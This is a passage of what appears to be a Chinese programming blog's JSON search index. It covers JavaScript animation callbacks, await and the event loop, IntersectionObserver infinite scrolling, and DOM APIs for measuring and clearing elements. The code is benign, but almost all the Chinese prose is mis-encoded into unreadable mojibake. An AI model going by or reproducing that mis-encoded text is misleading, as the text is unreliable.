åŸ·è¡Œå‹•ç•« -&gt; å‹•ç•«çµæŸå¾Œåˆªé™¤å…ƒç´  document .querySelector('button') .addEventListener('click', () =&gt; { animate( '.block', {'transform': 'translateX(400px)'}, 1, (element) =&gt; element.remove() ) }) å¦‚æœè¦æ”¯æ´å¤šå€‹ css è¦å‰‡è¦ä¿®æ”¹ä¸€ä¸‹ transition çš„éƒ¨åˆ†ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041/* @param selector: è¦åŸ·è¡Œå‹•ç•«çš„å…ƒç´  @param cssRule: è¦èª¿æ•´çš„ css è¦å‰‡ @param duration: å‹•ç•«ç§’æ•¸ @param callback: å‹•ç•«çµæŸå¾Œè¦åšçš„äº‹*/function animate(selector, cssRule, duration, callback) { const element = document.querySelector(selector) // å„²å­˜è¦åŠ ä¸Šæ¼¸è®Šæ•ˆæœçš„è¦å‰‡ let transitionValue = [] // æ›´æ–° css è¦å‰‡ for (let key in cssRule) { element.style[key] = cssRule[key] // å„²å­˜æ‰€æœ‰ css è¦å‰‡ transitionValue.push(key) } /* è¨­å®šæ¼¸è®Šï¼Œå…ˆ join å®Œå†è£œä¸Šå°¾ç¶´ é‡è¤‡çš„è¦å‰‡ï¼š'ç§’æ•¸s, ' =&gt; aaa 1s, bbb 1s */ element.style['transition'] = transitionValue.join(` ${duration}s, `) + ` ${duration}s` // å‹•ç•«åŸ·è¡Œå®Œå¾Œè¦åšçš„äº‹ setTimeout(() =&gt; { callback(element) }, duration * 1000)}document .querySelector('button') .addEventListener('click', () =&gt; { animate( '.block', { 'transform': 'translateX(400px)', 'background-color': 'red', 'width': '0px' }, 1, (element) =&gt; element.remove() ) }) å› ç‚º transition çš„éƒ¨åˆ†æ²’è¾¦æ³•ç”¨ += ä¾†æ–°å¢å€¼ï¼Œæ‰€ä»¥è¦æ‹†é–‹ä¾†å¯«ï¼Œä¸èƒ½å¯«åœ¨è¿´åœˆè£¡é¢ã€‚","link":"/2022/01/24/do-someting-after-animation/"},{"title":"await çš„ç­‰å¾…æ©Ÿåˆ¶è·Ÿæˆ‘æƒ³çš„ä¸å¤ªä¸€æ¨£","text":"çœŸç¥å¥‡ã€‚ ç°¡è¿°é¦–å…ˆä»¥ä¸‹éƒ½åªæ˜¯æˆ‘å€‹äººå¯¦é©—å‡ºçš„çµæœï¼Œä¸¦æ ¹æ“šå¯¦é©—çµæœä¾†å¾—å‡ºçš„ã€Œçµè«–ã€ã€‚æ²’æœ‰åƒè€ƒè¦ç¯„ï¼Œä¹Ÿæ¯«ç„¡æ˜ç¢ºæ€§å¯è¨€ï¼ˆä¹Ÿè¨±åªæ˜¯æˆ‘å”¬çˆ›ï¼‰ã€‚æ‰€ä»¥ç•¶ä½œåƒè€ƒå°±å¥½ï¼Œæˆ‘çš„è§€é»å¾ˆæœ‰å¯èƒ½æ˜¯éŒ¯çš„ã€‚ ç¯„ä¾‹å…ˆä¾†çœ‹ä¸€èˆ¬çš„åŒæ­¥è™•ç†ï¼Œç€è¦½å™¨åœ¨è™•ç†åŒæ­¥æ®µè½çš„æ™‚å€™æœƒå‡ºç¾ã€Œfreezeï¼ˆå‡çµï¼‰ã€çš„æƒ…å¢ƒï¼Œå¿…é ˆç­‰åˆ°åŒæ­¥åŸ·è¡Œå®Œå¾Œæ‰ã€Œunfreezeï¼ˆè§£å‡ï¼‰ã€ï¼š 1234567891011121314151617~async function() { // ç›£è½ click äº‹ä»¶ document .querySelector('button') .addEventListener('click', () =&gt; { console.log('click') }) // åŒæ­¥è·‘è¿´åœˆï¼Œé™·å…¥ freeze ç‹€æ…‹ // æ‰€æœ‰çš„ click éƒ½æœƒè¢«æ”¾åœ¨ callback queue for (let i=0; i&lt;=10000000000; i++) { } // ç­‰åˆ°è¿´åœˆè·‘å®Œ click æ‰æœƒå…¨éƒ¨è¹¦å‡ºä¾†ï¼ console.log('loop finished')}() Outputï¼š é—œæ–¼åŒæ­¥è¡Œç‚ºåœ¨ Event loop çš„æ©Ÿåˆ¶å¯ä»¥åƒè€ƒé€™å¼µç²¾ç¾çš„åœ–ï¼š æ¥ä¸‹ä¾†æ˜¯ await ç­‰å¾… Promise åŸ·è¡Œå®Œå¾Œçš„è™•ç†ã€‚ æˆ‘åŸæœ¬é æœŸæœƒè·Ÿä¸Šé¢ä¸€æ¨£ï¼Œå› ç‚º await ä¸å°±æ˜¯æŠŠéåŒæ­¥è®ŠæˆåŒæ­¥å—ï¼Ÿå®ƒå¿…é ˆç­‰åˆ° resolve å¾Œæ‰åŸ·è¡Œå¾Œé¢çš„ç¨‹å¼ç¢¼ï¼Œä½†å¯¦é©—çµæœæ˜¯å‡ºä¹é æ–™çš„ï¼š 1234567891011121314151617~async function() { document .querySelector('button') .addEventListener('click', () =&gt; { console.log('click') }) // å¦‚æœé€™è£¡ä¹Ÿè®ŠæˆåŒæ­¥ï¼Œ // é‚£æ‡‰è©²æœƒè·Ÿå‰›å‰›ä¸€æ¨£å‡ºç¾ freeze çš„æƒ…æ³ await new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { console.log('finished') resolve() }, 1000 * 5) }) // ç­‰ Promise è·‘å®Œæ‰åŸ·è¡Œ console.log('yo')}() Outputï¼š çµè«–å…¶å¯¦æˆ‘æ²’æœ‰å¾ˆæ‡‚èƒŒå¾Œçš„åŸç†æ˜¯ä»€éº¼ï¼Œä¸éå¾çµæœä¾†çœ‹ä¼¼ä¹ await ä¸¦ä¸æ˜¯çœŸçš„æŠŠ Promise å¾ã€ŒéåŒæ­¥ã€è®Šæˆã€ŒåŒæ­¥ã€ï¼Œè€Œæ˜¯æœ‰æŸç¨®æ©Ÿåˆ¶å¯ä»¥è®“ resolve åŸ·è¡Œå®Œå¾Œæ‰æ¥è‘—è·‘ï¼Œè€Œæœ€é‡è¦çš„æ˜¯é€™å€‹æ©Ÿåˆ¶ä¸æœƒè®“ç€è¦½å™¨è¢«å‡çµä½ã€‚ é¡Œå¤–è©±ï¼Œæœƒç„¡èŠåšé€™å¯¦é©—æ˜¯å› ç‚ºå­¸äº† await å¾Œçªç„¶å›æƒ³èµ·åŒæ­¥çš„æ¦‚å¿µã€‚åŒæ­¥çš„ç‰¹æ€§æ˜¯æœƒè®“ç€è¦½å™¨ã€Œå¡åœ¨å“ªè£¡ç­‰ã€ã€‚æ‰€ä»¥æ¨æ¸¬å¦‚æœçœŸæ˜¯å¦‚æ­¤çš„è©±ï¼Œé‚£ä¸å°±å¾ˆæœ‰å¯èƒ½åœ¨ç­‰æŸå€‹ Promise çµæŸå‰éƒ½è¢«ã€Œå¡ä½ã€å—ï¼Ÿé€™æ¨£ä¸æœƒæœ‰å•é¡Œå—ï¼Ÿå› æ­¤å°±æŠ±è‘—å¥½å¥‡çš„å¿ƒä¾†æ¸¬è©¦çœ‹ï¼Œåšäº†é€™å€‹å°å¯¦é©—ã€‚ æœ€å¾Œä¸å¾—ä¸èªªè¨­è¨ˆå‡ºé€™äº›æ±è¥¿çš„äººçœŸçš„å¾ˆå¼·å¤§ã€‚ å¾Œè¨˜ï¼ˆåŸæœ¬çš„æ¨å°éç¨‹ä¹Ÿè »æœ‰è¶£çš„ï¼Œæ‰€ä»¥å°±ç•™è‘—ä¸ä¿®æ­£äº†ï¼‰ å¾Œä¾†ä¸Šç¶²æŸ¥ä¹‹å¾Œç†è§£äº†ï¼ŒåŸä¾† await åªæ˜¯æŠŠ Promise åŒ…è£èµ·ä¾†çš„èªæ³•ç³–ã€‚æ„æ€æ˜¯èªª await åªæ˜¯è®“ä½ ã€Œçœ‹èµ·ä¾†å¥½åƒæ˜¯åŒæ­¥ã€ï¼Œä½†èƒŒå¾Œå…¶å¯¦æ˜¯å¹«ä½ æŠŠæ±è¥¿æ”¾åˆ° .then() è£¡é¢ä¸€å€‹ä¸€å€‹åŸ·è¡Œï¼Œåƒè€ƒä¸‹é¢çš„ä¾‹å­ï¼š 1234567891011121314151617181920~async function() { document .querySelector('button') .addEventListener('click', () =&gt; { console.log('click') }) // çœ‹èµ·ä¾†å¥½åƒæ˜¯åŒæ­¥ï¼Œå…ˆç­‰é€™è¡Œè·‘å®Œ await waitFiveSeconds() // æ‰åŸ·è¡Œé€™è¡Œ console.log('yo')}()function waitFiveSeconds() { return new Promise((resolve, reject) =&gt; { setTimeout(function() { resolve() }, 1000 * 5) })} ä½†æŠŠç³–æœæ‹†é–‹å¾Œå°±ç™¼ç¾ä¸€æ¨£æ˜¯ .thenï¼š 1234567891011121314151617181920212223~async function() { document .querySelector('button') .addEventListener('click', () =&gt; { console.log('click') }) /* .then: setTimeout çµæŸï¼Œresolve æ²’æœ‰å¸¶åƒæ•¸æ‰€ä»¥å›å‚³å€¼æ˜¯ undefined .then: ä¸‹ä¸€è¡Œè¦åŸ·è¡Œçš„ 'yo' */ waitFiveSeconds() .then(() =&gt; undefined) .then(() =&gt; console.log('yo'))}()function waitFiveSeconds() { return new Promise((resolve, reject) =&gt; { setTimeout(function() { resolve() }, 1000 * 5) })} æ‰€ä»¥é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼ await ä¸€å®šè¦æ”¾åœ¨ async å‡½å¼è£¡é¢ï¼Œå› ç‚ºåœ¨è£¡é¢å®ƒæ‰èƒ½å¤ æŠŠã€ŒéåŒæ­¥ã€ç”¨ Promise åŒ…è£èµ·ä¾†ï¼Œè®“ä½ æ„Ÿè¦ºåƒæ˜¯ã€ŒåŒæ­¥ã€åŸ·è¡Œä¸€æ¨£ï¼Œä½†å…¶å¯¦èƒŒå¾Œé‚„æ˜¯ç”¨ .then ä¸€è¡Œä¸€è¡Œä¾†åŸ·è¡Œçš„ã€‚ æœ€å¾Œåœ¨é™„ä¸Šä¸€å€‹å°ç¯„ä¾‹ï¼Œçœ‹ä½ èƒ½ä¸èƒ½çŒœå‡ºæ­£ç¢ºçš„åŸ·è¡Œé †åºï¼š 12345678910111213141516171819202122~async function() { // åŒæ­¥ console.log('sync') // éåŒæ­¥ document .querySelector('button') .addEventListener('click', () =&gt; { console.log('click') }) // éåŒæ­¥ï¼Œä½†ç”¨ Promise åŒ…èµ·ä¾†æ§åˆ¶åŸ·è¡Œé †åº // .then(() =&gt; undefined) await new Promise((resolve, reject) =&gt; { setTimeout(() =&gt; { console.log('finished') resolve() }, 1000 * 5) }) // .then(() =&gt; console.log(yo)) console.log('yo')}()// åŒæ­¥console.log('haha') ç­”æ¡ˆæ˜¯ï¼š 1234synchahafinishedyo","link":"/2022/01/23/does-await-make-freezing/"},{"title":"åˆ©ç”¨ IntersectionObserver ä¾†è£½ä½œç„¡é™æ»¾å‹•","text":"é‚„ä¸éŒ¯ç”¨ï½ åŸºæœ¬æ¦‚å¿µç°¡å–®ä¾†èªª IntersectionObserver æ˜¯ä¸€å€‹ç‰©ä»¶ï¼Œä½ å¿…é ˆå…ˆå®šç¾©å¥½ä¸€äº›è¨­å®šï¼š root å¤–å±¤å®¹å™¨ target å®¹å™¨ä¸­æœƒå‡ºç¾çš„å…ƒç´  threshold é‡ç–Šç‡ callback é€²å…¥è·Ÿé›¢é–‹å¯è¦–ç¯„åœæ™‚å°±å‘¼å« callback ä¾†é€šçŸ¥ä½  åŸç†æ˜¯åœ¨èƒŒå¾Œç›£è½ root å’Œ target çš„ã€Œé‡ç–Šç¨‹åº¦ã€ï¼Œç•¶é”åˆ°æŒ‡å®šçš„ã€Œå¯è¦–ç¯„åœã€æ™‚å°±å‘¼å« callback ä¸åŒæ–¼ scroll äº‹ä»¶çš„åœ°æ–¹æ˜¯ï¼Œå®ƒçš„ç²¾æº–åº¦ä¸èƒ½è¨ˆç®—åˆ° 1 å€‹ px ä¸å·®ï¼Œæ„æ€æ˜¯èªª threshold è¨­ç‚º 0 çš„æ™‚å€™æœªå¿…æœƒåœ¨ã€Œå‰›å¥½ 0pxã€çš„æ™‚å€™æ‰è§¸ç™¼ callbackï¼Œæœ‰å¯èƒ½æ˜¯ 0.01 æˆ– 0.1ã€‚ï¼ˆä¸éé€šå¸¸ä½ ä¹Ÿä¸å¤ªéœ€è¦ç²¾æº–åˆ° 100%ï¼‰ åŸºæœ¬ä¸Šå°±æ˜¯é€™æ¨£ï¼Œå‰©ä¸‹çš„ç”¨ç¯„ä¾‹ä¾†è§£é‡‹å§ã€‚ ç¯„ä¾‹åŸºæœ¬çµæ§‹123456789101112// å¤–å±¤å®¹å™¨const root = document.querySelector('.root')// å®¹å™¨ä¸­çš„å…ƒç´ const target = document.querySelector('.detector')// new ä¸€å€‹ IntersectionObserver å‡ºä¾†const observer = new IntersectionObserver(callback, { root: root, rootMargin: '0px', threshold: 0})// ç¶å®šè¦ç›£è½çš„ target ï¼Œå¯ä»¥æƒ³æˆæ˜¯ addEventListenr çš„æ¦‚å¿µobserver.observe(target) å‚™è¨»ï¼šroot æ²’æœ‰è¨­å®šçš„è©±é è¨­æ˜¯ nullï¼Œé€™æ™‚å€™æœƒç­‰æ–¼ç€è¦½å™¨çš„ viewportã€‚ çµæ§‹å¤§è‡´ä¸Šå°±æ˜¯é€™æ¨£ï¼Œæ³¨æ„ä¸€ä¸‹ IntersectionObserver åœ¨ new çš„æ™‚å€™æœ‰å…©å€‹åƒæ•¸ï¼š callback é€²å…¥è·Ÿé›¢é–‹å¯è¦–ç¯„åœæ™‚é€šçŸ¥ä½ ï¼Œä½ å¯ä»¥åœ¨é€™è£¡åšäº‹æƒ… options ä¸€äº›å¯ä»¥è¨­å®šè³‡è¨Šï¼Œroot æ˜¯èª°ï¼Œé‡ç–Šç‡å¤šå°‘çš„æ™‚å€™æ‰ç®—å¯è¦‹ç­‰ç­‰ä¹‹é¡çš„ã€‚ æœ€é‡è¦çš„æ˜¯ threshold çš„å€¼ï¼Œé€™å€‹ä»£è¡¨ root è·Ÿ target çš„é‡ç–Šç‡å¤šå°‘æ™‚è¦å‘¼å« callbackã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœè¨­ç‚º 1 å°±ä»£è¡¨ã€Œå¿…é ˆåœ¨å®¹å™¨ä¸­å®Œæ•´çœ‹åˆ° targetã€æ‰æœƒè§¸ç™¼ callbackï¼›å¦‚æœè¨­ç‚º 0 å°±ä»£è¡¨ã€Œåªè¦åœ¨å®¹å™¨ä¸­ä¸€çœ‹åˆ° targetã€å°±è§¸ç™¼ callbackã€‚ å¦å¤–é‚„æœ‰å€‹åœ°æ–¹è¦ç‰¹åˆ¥æ³¨æ„ï¼Œå°±æ˜¯å‘¼å« callback çš„æ™‚æ©Ÿé»æ˜¯ã€Œé€²å…¥ã€è·Ÿã€Œé›¢é–‹ã€æ™‚éƒ½æœƒè§¸ç™¼ï¼Œæ„æ€æ˜¯èªªä¸€é–‹å§‹ target é€²å…¥è¦–ç·šæ™‚æœƒè§¸ç™¼ä¸€æ¬¡ï¼Œç•¶ target é›¢é–‹è¦–ç·šä¹Ÿæœƒå†è§¸ç™¼ä¸€æ¬¡ã€‚ é€™é‚Šçš„ threshold æ˜¯è¨­ç‚º 0ï¼Œæ‰€ä»¥ä¸€çœ‹åˆ° target å°±æœƒè§¸ç™¼ callbackï¼Œè€Œé›¢é–‹çš„æ™‚å€™ä¹Ÿæœƒè§¸ç™¼ä¸€æ¬¡ã€‚ callback æ¥æ”¶çš„å…©å€‹åƒæ•¸åˆ†åˆ¥æ˜¯ entries è·Ÿ observerï¼š entriesï¼Œä¸€å€‹ Array è£¡é¢è£è‘— IntersectionObserverEntry ç‰©ä»¶ï¼Œå¯ä»¥æ‹¿åˆ°ä¸€äº›å¿…è¦è³‡è¨Šã€‚ observerï¼Œå°±æ˜¯è¢« new å‡ºä¾†çš„ observer ç‰©ä»¶è‡ªå·± isIntersecting è·Ÿ intersectionRatio é€™å…©å€‹æ¯”è¼ƒé‡è¦ï¼š isIntersecting true / false ä»£è¡¨ target å¯ä¸å¯è¦‹ï¼Œå¯ä»¥åœ¨ callback ä¸­ç”¨å®ƒä¾†åˆ¤æ–·æ˜¯ã€Œé€²å…¥ã€é‚„æ˜¯ã€Œé›¢é–‹ã€çš„ç‹€æ…‹ã€‚ intersectionRatio å°±æ˜¯ã€Œé‡ç–Šç‡ã€ï¼Œdebug çš„æ™‚å€™å¯ä»¥ç”¨å®ƒä¾†æª¢æŸ¥ã€‚ èˆ‰å€‹ä¾‹å­ï¼š 123456789101112// è§£æ§‹é™£åˆ—function callback([ entries ], observer) { if (entries.isIntersecting) { console.log('é‡ç–Šç‡ï¼š',entries.intersectionRatio) console.log('target æ˜¯å¦å¯è¦‹ï¼š',entries.isintersectiing) console.log('é€²å…¥å¯è¦–ç¯„åœï¼') } else { console.log('é‡ç–Šç‡ï¼š',entries.intersectionRatio) console.log('target æ˜¯å¦å¯è¦‹ï¼š',entries.isintersectiing) console.log('é›¢é–‹å¯è¦–ç¯„åœ') }} æ‰€ä»¥åœ¨è£½ä½œç„¡é™æ»¾å‹•æ™‚ï¼Œå› ç‚ºæ–°å¢å…§å®¹è€Œé›¢é–‹å¯è¦–ç¯„åœæ™‚æœƒåœ¨è§¸ç™¼ä¸€æ¬¡ callbackï¼Œå°±æœƒæœ‰ã€Œé‡è¤‡è§¸ç™¼ã€çš„å•é¡Œã€‚å¦‚æœè¦é¿å…é€™ç¨®æƒ…æ³ï¼Œå°±èƒ½ç”¨ isIntersecting ä¾†ç¢ºèªæ˜¯ã€Œé€²å…¥ã€å¯è¦–ç¯„åœæ™‚æ‰åšè™•ç†ã€‚ ç„¡é™æ»¾å‹•ç¯„ä¾‹åŸç†ä¸è¤‡é›œï¼Œå°±æ˜¯åœ¨ä¸€å€‹ container è£¡é¢æ”¾ä¸€å€‹ sentinelï¼ˆå“¨å…µï¼‰ï¼Œç•¶ sentinel é€²å…¥å¯è¦–ç¯„åœæ™‚å°±é€é callback ä¾†æ–°å¢å…§å®¹ã€‚ 1234567&lt;!-- å¤–å±¤å®¹å™¨ --&gt;&lt;div class=\"root\"&gt; &lt;!-- æ–‡ç« åˆ—è¡¨ --&gt; &lt;div class=\"list\"&gt;&lt;/div&gt; &lt;!-- å“¨å…µ --&gt; &lt;div class=\"sentinel\"&gt;I am detector!&lt;/div&gt;&lt;/div&gt; 123456789101112131415const root = document.querySelector('.root')const target = document.querySelector('.sentinel')const observer = new IntersectionObserver(callback, { root: root, rootMargin: '0px', threshold: 1})observer.observe(target)function callback([ entries ], observer) { // ç¢ºèªæ˜¯ã€Œé€²å…¥ã€æ‰æ–°å¢æ–‡ç«  if (entries.isIntersecting) { insertArticle(1) }} é€™é‚Šç‚ºäº†æ–¹ä¾¿è§€å¯Ÿæ‰€ä»¥æŠŠ threshold è¨­ç‚º 1ï¼Œä»£è¡¨è¦ã€Œå®Œæ•´çœ‹åˆ° targetã€æ‰æœƒè§¸ç™¼ callbackã€‚å¦å¤–ç‚ºäº†é¿å…é›¢é–‹ target æ™‚å†æ¬¡è§¸ç™¼æ‰€ä»¥è¦ç”¨ isIntersecting ä¾†åšåˆ¤æ–·ã€‚ åšå€‹ç¤ºç¯„ï¼Œå…ˆç¤ºç¯„æ­£ç¢ºçš„åšæ³•ï¼š 12345678910/* åªåœ¨é€²å…¥çš„æƒ…æ³æ–°å¢å…§å®¹ */function callback([ entries ], observer) { if (entries.isIntersecting) { console.log('é€²å…¥å¯è¦–ç¯„åœ') /* ä¸€æ¬¡æ–°å¢ 3 å€‹ */ insertArticle() } else { console.log('é›¢é–‹å¯è¦–ç¯„åœ') }} éŒ¯èª¤çš„åšæ³•ï¼ˆæœƒé‡è¤‡è§¸ç™¼ï¼‰ï¼š 12345678910/* å¦‚æœæ²’æœ‰æª¢æŸ¥çš„è©±ï¼Œå…¶å¯¦å°±è·Ÿä¸‹é¢çš„åšæ³•æ˜¯ä¸€æ¨£çš„æ„æ€ */function callback([ entries ], observer) { if (entries.isIntersecting) { console.log('é€²å…¥å¯è¦–ç¯„åœ') insertArticle() } else { console.log('é›¢é–‹å¯è¦–ç¯„åœ') insertArticle() }} æ³¨æ„å› ç‚ºè§¸ç™¼äº†å…©æ¬¡ï¼Œæ‰€ä»¥å…§å®¹ä¸€æ¬¡å¤šäº† 6 å€‹ã€‚ ç¸½è€Œè¨€ä¹‹æ³¨æ„é€™å€‹å•é¡Œå°±å¥½ï¼Œå…¶ä»–å°±å·®ä¸å¤šé€™æ¨£äº†ã€‚","link":"/2022/01/29/dom-IntersectionObserver/"},{"title":"DOM ä¸€äº›é‚Šç·£ä½†è »å¥½ç”¨çš„ API","text":"æ‡¶äººåŒ…ã€‚ element.getBoundingClientRect()å–å¾—å…ƒç´ çš„å¯¬é«˜èˆ‡ä½ç½®è³‡è¨Š 12345678&lt;style&gt; div { width: 400px; padding: 10px; border: 10px; }&lt;/style&gt;&lt;div&gt;yoyoyo&lt;/div&gt; 1console.log(document.querySelector('div').getBoundingClientRect()) Outputï¼š 12345678910{ x: 8 y: 8 top: 8 left: 8 right: 448 bottom: 66.4000015258789 width: 440 height: 58.400001525878906} æ­¤æ–¹æ³•å›å‚³çš„å¯¬é«˜æ˜¯æ¡ç”¨ border-box çš„è¨ˆç®—æ–¹å¼ï¼Œæ„æ€å°±æ˜¯ç®—åˆ° boder ç‚ºæ­¢ã€‚ è€Œåº§æ¨™éƒ¨åˆ†æ˜¯ç›¸å°æ–¼ viewport x / left å…ƒç´ çš„å·¦ä¸Šè§’èˆ‡ viewport çš„æ°´å¹³è·é›¢ y / top å…ƒç´ çš„å·¦ä¸Šè§’èˆ‡ viewport çš„å‚ç›´è·é›¢ right / bottom å…ƒç´ çš„å³ä¸‹è§’è·é›¢ viewport çš„æ°´å¹³å‚ç›´è·é›¢ window.scrollTo()è¨­å®šæ»¾è»¸è¦æ»¾åˆ°å“ªè£¡ 123456789101112/* é–‰åŒ…ï¼ŒæŠŠè®Šæ•¸ index è—èµ·ä¾† */function scrollDown() { let index = 1 return function callback() { window.scrollTo({ top: index * 4000 }) index++ }}/* æ¯é»ä¸€ä¸‹æŒ‰éˆ•å°±å¾€ä¸‹æ»¾ 4000px */document.querySelector('button').onclick = scrollDown() ä¹Ÿå¯ä»¥è¨­æˆé€™æ¨£ï¼Œå°±æœƒæœ‰ smooth çš„æ•ˆæœï¼š 12345678910111213141516function scrollDown() { let index = 1 return function callback() { /* top: y è»¸ left: x è»¸ behavior: smooth, instant, auto */ window.scrollTo({ top: 4000 * index, behavior: 'smooth' }) index++ }}document.querySelector('button').onclick = scrollDown() offsetTop / offsetLefté™„è¨»ï¼šå¦‚æœä¸çŸ¥é“å¯¦éš› parent æ˜¯èª°ï¼Ÿå¯ä»¥ç”¨ offsetParent ä¾†æŸ¥è©¢ã€‚ æ‰¾åˆ°ç¬¬ä¸€å€‹ position é static çš„ parent ä¸¦è¨ˆç®—è·é›¢ parent çš„ padding æœƒè¨ˆç®—é€²å» åŸå§‹ç¢¼å¯ä»¥åˆ° Codepen ä¸Šåƒè€ƒ clientWidth / clientHeightæ ¹æ“šè©²å…ƒç´ çš„å¯¦éš›å¤§å°ä¾†è¨ˆç®—å¯¬èˆ‡é«˜ï¼ŒæœƒåŒ…å« paddingï¼Œä½†ä¸åŒ…å« border å’Œ scrollbarã€‚ åŸå§‹ç¢¼å¯ä»¥åˆ° Codepen ä¸Šåƒè€ƒ ç¶²å€ç›¸é—œ window.location.reload() é‡æ–°æ•´ç†ç›®å‰çš„é é¢ window.location.assign(url) è·³è½‰åˆ°æ–°çš„é é¢ï¼Œæœƒç•™ä¸‹æ­·å²ç´€éŒ„ï¼ˆå¯ä»¥æŒ‰ä¸Šä¸€é ï¼‰ window.location.replace(url) æ›´æ–°ç›®å‰çš„é é¢ï¼Œä¸æœƒç•™ä¸‹æ­·å²ç´€éŒ„ï¼ˆä¸èƒ½æŒ‰ä¸Šä¸€é ï¼‰ window.location.search æŸ¥çœ‹ç¶²å€çš„ query string","link":"/2022/01/24/dom-api/"},{"title":"DOM æ¸…é™¤æ‰€æœ‰çš„å­å…ƒç´ ","text":"åœ¨ç·´ç¿’æ™‚ç¢°åˆ°çš„å•é¡Œã€‚ æ–¹æ³•ä¸€ innerHTMLæœ€ç›´è¦ºä¹Ÿç°¡å–®çš„æ–¹æ³•ï¼Œä½†æœƒæœ‰æ•ˆèƒ½ä¸Šçš„å•é¡Œï¼ˆæœƒè§¸ç™¼ç€è¦½å™¨é‡æ–° parseï¼‰ï¼š 123456789101112&lt;div class=\"parent\"&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 1document.querySelector('.parent').innerHTML = '' Outputï¼š 1&lt;div class=\"parent\"&gt;&lt;/div&gt; æ–¹æ³•äºŒ textContentä¸æœƒè§¸ç™¼ç€è¦½å™¨é‡æ–° parseï¼ŒåŸç†æ˜¯æŠŠå­å…ƒç´ éƒ½è®Šæˆ #textï¼š 123456789101112&lt;div class=\"parent\"&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 1document.querySelector('.parent').textContent = '' Outputï¼š 1&lt;div class=\"parent\"&gt;&lt;/div&gt; æ–¹æ³•ä¸‰ while è¿´åœˆ + lastChildå»ºè­°å¾ lastChild ä¾†åˆªï¼Œæ¯”è¼ƒä¸æœƒå‡ºç¾ä¸€äº›èª¤å·®å•é¡Œï¼š 123456789101112&lt;div class=\"parent\"&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 123456789const node = document.querySelector('.parent')removeAllChild(node)function removeAllChild(node) { while(node.firstChild) { // åªè¦åº•ä¸‹æœ‰å­å…ƒç´ å°±åŸ·è¡Œ node.removeChild(node.lastChild) }} Outputï¼š 1&lt;div class=\"parent\"&gt;&lt;/div&gt; æ–¹æ³•å›› while è¿´åœˆ + lastElementChildæœƒç•™ä¸‹ #text è·Ÿ #comment ç¯€é»çš„æ–¹æ³•ï¼Œç›®çš„æ˜¯å› ç‚ºæ—©æœŸæ”¯æ´è¦ IE çš„æ™‚å€™æœƒä¸å¸Œæœ›æŠŠ comment çµ¦åˆªé™¤ã€‚ä½†ç¾åœ¨ IE å·²æ­»æ‰€ä»¥é€™æ–¹æ³•æ¯”è¼ƒä¸å¸¸ç”¨äº†ï¼š 123456&lt;div id='foo'&gt; &lt;!-- This comment won't be removed --&gt; &lt;span&gt;Hello &lt;!-- This comment WILL be removed --&gt;&lt;/span&gt; &lt;!-- But this one won't. --&gt;&lt;/div&gt;&lt;button id='doFoo'&gt;Remove via lastElementChild-loop&lt;/button&gt; 12345678const doFoo = document.getElementById('doFoo')doFoo.onclick = () =&gt; { const node = document.getElementById('foo') while(node.lastElementChild) { node.removeChild(node.lastElementChild) } console.log(node.childNodes)} Outputï¼š 1234&lt;div id='foo'&gt; &lt;!-- This comment won't be removed --&gt; &lt;!-- But this one won't. --&gt;&lt;/div&gt; æ–¹æ³•å›› replaceChildrenå¦‚æœä¸å‚³å…¥ node ä»£è¡¨åˆªé™¤æ‰€æœ‰å­å…ƒç´ ï¼Œæœ‰çš„è©±å‰‡æœƒè¢«æ”¾é€²å»å–ä»£ï¼š 1234&lt;div id='foo'&gt; &lt;span&gt;Hello&lt;/span&gt; &lt;p&gt;yoyoyo&lt;/p&gt;&lt;/div&gt; 123const newElem1 = document.createElement('article')const newElem2= document.createElement('section')document.getElementById('foo').replaceChildren(newElem1, newElem2) Outputï¼š 1234&lt;div id='foo'&gt; &lt;article&gt;&lt;/article&gt; &lt;section&gt;&lt;/section&gt;&lt;/div&gt; åˆªé™¤æ‰€æœ‰å­å…ƒç´ ï¼š 1document.getElementById('foo').replaceChildren() Outputï¼š 1&lt;div id='foo'&gt;&lt;/div&gt;","link":"/2022/01/28/dom-remove-all-child/"},{"title":"DOM æ¸…æ‰æƒ±äººçš„æ–‡å­—ç¯€é»","text":"çœŸçš„å¾ˆè…¦è€¶ï¼ ç°¡è¿°å‡è¨­ä½ æœ‰æ®µ HTML é•·é€™æ¨£ï¼š 12345678&lt;div class=\"block\"&gt; &lt;!-- yo --&gt; &lt;p&gt;lala la&lt;/p&gt; &lt;!-- yo --&gt; &lt;p&gt;aaa&lt;/p&gt; &lt;!-- yo --&gt; &lt;p&gt;bbbb&lt;/p&gt;&lt;/div&gt; é‚£ç”Ÿæˆ DOM çš„æ™‚å€™æœƒè®Šé€™æ¨£ï¼š 1234567891011121314151617DIV#text (\"\\n\\t\") -&gt; æ–‡å­—ç¯€é»ï¼ˆæ›è¡Œï¼‰#comment -&gt; è¨»è§£ç¯€é»#text (\"\\n\\t\") -&gt; æ–‡å­—ç¯€é»ï¼ˆæ›è¡Œï¼‰+ P| + #text (\"lala la\") -&gt; æ–‡å­—ç¯€é»ï¼ˆp çš„å…§å®¹ï¼‰+ #text (\"\\n\\t\") -&gt; æ–‡å­—ç¯€é»ï¼ˆæ›è¡Œï¼‰#comment -&gt; è¨»è§£ç¯€é»#text (\"\\n\\t\") -&gt; æ–‡å­—ç¯€é»ï¼ˆæ›è¡Œï¼‰+ P| + #text (\"aaa\") -&gt; æ–‡å­—ç¯€é»ï¼ˆp çš„å…§å®¹ï¼‰+ #text (\"\\n\\t\") -&gt; æ–‡å­—ç¯€é»ï¼ˆæ›è¡Œï¼‰#comment -&gt; è¨»è§£ç¯€é»#text (\"\\n\\t\") -&gt; æ–‡å­—ç¯€é»ï¼ˆæ›è¡Œï¼‰+ P| + #text (\"bbbb\") -&gt; æ–‡å­—ç¯€é»ï¼ˆp çš„å…§å®¹ï¼‰+ #text 